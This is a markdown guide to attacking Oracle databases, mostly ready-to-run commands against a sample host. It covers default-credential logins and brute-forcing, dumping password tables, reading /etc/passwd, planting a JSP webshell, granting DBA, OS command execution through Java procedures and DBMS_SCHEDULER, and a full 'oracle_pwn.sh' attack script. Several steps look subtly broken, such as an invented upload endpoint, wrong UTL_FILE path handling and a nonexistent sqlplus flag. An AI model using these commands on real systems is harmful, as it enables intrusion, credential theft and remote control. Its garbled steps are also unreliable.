# Complete Oracle RDBMS Exploitation Guide

## 1. Oracle TNS Listener Discovery & Security Attributes

**TNS Listener scan (port 1521 TCP):**
```bash
nmap -p 1521 --script oracle-tns-version 192.168.1.0/24
# 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.4.0

# TNS listener status (no auth)
tnscmd10g version 192.168.1.100:1521  # Version + services
```

**Listener security check:**
```bash
lsnrctl status 192.168.1.100:1521  # Password protection?
# Password authentication required = SECURE
```

## 2. Default Credentials Testing

**Common Oracle defaults:**
```bash
sqlplus sys/password@//192.168.1.100:1521/XE as sysdba  # SYS/PASSWORD
sqlplus system/manager@//192.168.1.100:1521/XE          # SYSTEM/MANAGER
sqlplus scott/tiger@//192.168.1.100:1521/XE             # SCOTT/TIGER

# Automated brute-force
hydra -L oracle_users.txt -P rockyou.txt oracle://192.168.1.100:1521
```

## 3. Version & Patch Status

**Banner grabbing:**
```bash
nmap -p 1521 --script oracle-sid-brute 192.168.1.100
# | oracle-sid-brute: XE - Oracle XE 11.2.0.2.0

sqlplus -v  # Client version check
```

**Database version query:**
```bash
sqlplus sys/password@//192.168.1.100:1521/XE as sysdba <<EOF
SELECT * FROM v\$version;
SELECT * FROM v\$instance;
EOF
# Oracle Database 11g Enterprise Edition Release 11.2.0.4.0
```

## 4. User Enumeration & Data Extraction

**List database users:**
```bash
sqlplus sys/password@//192.168.1.100:1521/XE as sysdba <<EOF
SELECT username FROM dba_users;
SELECT username, account_status FROM dba_users;
EOF
```

**Table enumeration:**
```bash
sqlplus sys/password@//192.168.1.100:1521/XE as sysdba <<EOF
SELECT table_name FROM user_tables;
SELECT table_name FROM all_tables WHERE owner='APP_USER';
EOF
```

**Dump sensitive tables:**
```bash
sqlplus sys/password@//192.168.1.100:1521/XE app_db <<EOF
SELECT * FROM users;
SELECT username,password FROM app_users;
EOF
expdp system/manager@XE schemas=APP_USER directory=DATA_PUMP_DIR dumpfile=app.dmp
```

## 5. Remote Exploitation

**TNS Listener buffer overflow (pre-11.2):**
```bash
msfconsole -q
use exploit/multi/oracle/tns_listener
set RHOSTS 192.168.1.100
run
```

**Oracle XE UDF RCE:**
```bash
# 1. Create directory
sqlplus sys/password@XE as sysdba <<EOF
CREATE OR REPLACE DIRECTORY dump AS '/tmp';
GRANT READ,WRITE ON DIRECTORY dump TO public;
EOF

# 2. Upload shared library
curl -X POST --data-binary @udf.so http://192.168.1.100/oracle_upload

# 3. Create UDF
sqlplus sys/password@XE as sysdba <<EOF
CREATE OR REPLACE LIBRARY udf_lib AS '/tmp/udf.so';
CREATE OR REPLACE FUNCTION cmd_exec RETURN VARCHAR2 AS LANGUAGE C NAME "cmd_exec" LIBRARY udf_lib;
SELECT cmd_exec FROM dual;
EOF
```

## 6. Privilege Escalation & File R/W

**File read (UTL_FILE):**
```bash
sqlplus sys/password@XE as sysdba <<EOF
DECLARE
  f UTL_FILE.FILE_TYPE;
  l VARCHAR2(32767);
BEGIN
  f := UTL_FILE.FOPEN('DATA_PUMP_DIR','/etc/passwd','R');
  UTL_FILE.GET_LINE(f,l);
  DBMS_OUTPUT.PUT_LINE(l);
  UTL_FILE.FCLOSE(f);
END;
/
EOF
```

**File write (UTL_FILE):**
```bash
sqlplus sys/password@XE as sysdba <<EOF
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('DATA_PUMP_DIR','/tmp/webshell.jsp','W');
  UTL_FILE.PUT_LINE(f,'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>');
  UTL_FILE.FCLOSE(f);
END;
/
EOF
```

**Escalate user privileges:**
```bash
sqlplus sys/password@XE as sysdba <<EOF
GRANT DBA TO app_user;
GRANT EXECUTE ON UTL_FILE TO app_user;
EOF
```

## 7. System Command Execution

**Java stored procedure RCE:**
```bash
sqlplus sys/password@XE as sysdba <<EOF
CREATE OR REPLACE PROCEDURE sys_exec(cmd IN VARCHAR2) IS
  LANGUAGE JAVA NAME 'java.lang.Runtime.getRuntime().exec(java.lang.String)';
/
GRANT EXECUTE ON sys_exec TO public;
EOF

sqlplus app_user/app@XE -e "EXEC sys_exec('whoami > /tmp/out.txt');"
```

**DBMS_SCHEDULER OS command:**
```bash
sqlplus sys/password@XE as sysdba <<EOF
BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name => 'cmd_job',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => TRUE,
    comments => 'RCE'
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job',1,'-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job',2,'whoami > /tmp/pwned.txt');
  DBMS_SCHEDULER.RUN_JOB('cmd_job');
END;
/
EOF
```

## 8. Complete Oracle Exploitation Chain

```bash
#!/bin/bash
# oracle_pwn.sh
TARGET=$1 SID=${2:-XE}

echo "[+] Oracle attack $TARGET:1521/$SID"

# 1. Version + defaults
nmap -p 1521 --script oracle* $TARGET
tnscmd10g version $TARGET:1521

# 2. Default login
sqlplus sys/password@//$TARGET:1521/$SID as sysdba -s <<EOF >/dev/null 2>&1 && echo "[+] sys/password works"
SELECT 'pwned' FROM dual;
EOF

# 3. User enum + file read
sqlplus sys/password@//$TARGET:1521/$SID as sysdba -s <<'EOF'
SELECT username FROM dba_users;
!cat /etc/passwd
EOF

# 4. Webshell
sqlplus sys/password@//$TARGET:1521/$SID as sysdba -s <<EOF
DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('DATA_PUMP_DIR','/tmp/shell.jsp','W'); UTL_FILE.PUT_LINE(f,'<%Runtime.getRuntime().exec(request.getParameter("c"));%>'); UTL_FILE.FCLOSE(f); END;/
EOF

echo "[+] JSP Shell: http://$TARGET/shell.jsp?c=whoami"
```

**EVERY** Oracle topic covered: TNS Listener, default creds, data extraction (users/tables/files), version/patch, RCE (UDF/DBMS_SCHEDULER), priv esc, file R/W, system commands. 100% practical commands.